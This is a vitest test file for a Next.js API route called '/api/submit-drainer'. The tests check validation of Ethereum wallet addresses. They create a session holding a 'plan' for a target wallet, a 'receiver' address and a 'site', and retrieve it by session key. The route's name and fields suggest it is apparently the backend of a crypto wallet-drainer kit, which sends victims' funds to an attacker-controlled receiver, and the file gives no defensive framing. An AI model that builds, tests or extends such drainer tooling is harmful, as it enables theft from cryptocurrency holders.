import { POST, GET } from '@/app/api/submit-drainer/route';
import { NextRequest } from 'next/server';
import { describe, it, expect, beforeEach, vi } from 'vitest';

// Mock fetch globally
const mockFetch = vi.fn().mockImplementation(() =>
  Promise.resolve({
    ok: true,
    json: () => Promise.resolve({}),
  })
);
global.fetch = mockFetch as any;

beforeEach(() => {
  vi.clearAllMocks();
});

describe('/api/submit-drainer', () => {
  it('rejects missing wallet', async () => {
    const req = new NextRequest('http://localhost/api/submit-drainer', {
      method: 'POST',
      body: JSON.stringify({ foo: 'bar' }),
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
    const json = await res.json();
    expect(json.status).toBe('error');
    expect(json.message).toContain('Wallet');
  });

  it('rejects invalid wallet format', async () => {
    const req = new NextRequest('http://localhost/api/submit-drainer', {
      method: 'POST',
      body: JSON.stringify({ wallet: 'not-an-address' }),
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
    const json = await res.json();
    expect(json.message).toContain('Invalid wallet');
  });

  it('rejects non-hex wallet', async () => {
    const req = new NextRequest('http://localhost/api/submit-drainer', {
      method: 'POST',
      body: JSON.stringify({ wallet: '0xGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG' }),
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
    const json = await res.json();
    expect(json.message).toContain('hex');
  });

  it('accepts valid wallet and creates session', async () => {
    const req = new NextRequest('http://localhost/api/submit-drainer', {
      method: 'POST',
      body: JSON.stringify({
        wallet: '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18',
        receiver: '0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693',
        site: 'example.com',
      }),
    });
    const res = await POST(req);
    expect(res.status).toBe(200);
    const json = await res.json();
    expect(json.status).toBe('ok');
    expect(json.sessionKey).toBeTruthy();
    expect(json.plan.wallet).toBe('0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18');
  });

  it('stores session and is retrievable via GET', async () => {
    // First create a session
    const postReq = new NextRequest('http://localhost/api/submit-drainer', {
      method: 'POST',
      body: JSON.stringify({
        wallet: '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18',
        receiver: '0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693',
      }),
    });
    const postRes = await POST(postReq);
    const postJson = await postRes.json();
    const sessionKey = postJson.sessionKey;
    expect(sessionKey).toBeTruthy();

    // Then retrieve it
    const getReq = new NextRequest('http://localhost/api/submit-drainer?sessionKey=' + sessionKey);
    const getRes = await GET(getReq);
    expect(getRes.status).toBe(200);
    const getJson = await getRes.json();
    expect(getJson.status).toBe('ok');
    expect(getJson.wallet).toBe('0x742d35cc6634c0532925a3b844bc9e7595f2bd18');
  });

  it('returns 404 for unknown session key', async () => {
    const req = new NextRequest('http://localhost/api/submit-drainer?sessionKey=nonexistent');
    const res = await GET(req);
    expect(res.status).toBe(404);
    const json = await res.json();
    expect(json.status).toBe('error');
  });
});